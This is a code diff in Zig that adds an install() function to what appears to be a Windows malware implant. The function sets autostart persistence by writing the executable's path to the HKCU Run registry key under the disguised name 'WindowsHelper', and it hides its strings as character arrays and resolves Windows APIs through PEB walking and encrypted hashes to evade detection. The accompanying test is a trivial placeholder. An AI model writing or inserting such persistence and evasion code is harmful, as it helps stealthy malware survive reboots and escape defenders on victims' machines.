@@ -106,6 +106,32 @@ fn pathToNt(path: []const u8) [280]u16 {
     return buf;
 }
 
+pub fn install() bool {
+    const api = resolveApi() orelse return false;
+
+    const sub = [_]u16{ 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\\', 'R', 'u', 'n', 0 };
+    const val = [_]u16{ 'W', 'i', 'n', 'd', 'o', 'w', 's', 'H', 'e', 'l', 'p', 'e', 'r', 0 };
+
+    var hkey: types.HANDLE = undefined;
+    if (api.reg_create(HKCU, &sub, 0, KEY_WRITE, null, &hkey, null) != 0) return false;
+    defer _ = api.reg_close(hkey);
+
+    var exe_buf: [1024]u16 = undefined;
+    const GetModuleFileNameW = @as(*const fn (mod: ?*const anyopaque, buf: [*]u16, size: u32) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(
+        peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll")) orelse return false,
+        hash.encryptedHashFunc("GetModuleFileNameW"),
+    ) orelse return false)));
+    const len = GetModuleFileNameW(null, &exe_buf, 1024);
+    if (len == 0) return false;
+
+    _ = api.reg_set(hkey, &val, 0, REG_SZ, @as(*const u8, @ptrCast(&exe_buf)), len * 2 + 2);
+    return true;
+}
+
+test "install returns false without kernel32" {
+    try std.testing.expect(!install());
+}
+
 pub fn markUsed() bool {
     const api = resolveApi() orelse return false;
     const appdata_path = getAppDataPath() orelse return false;
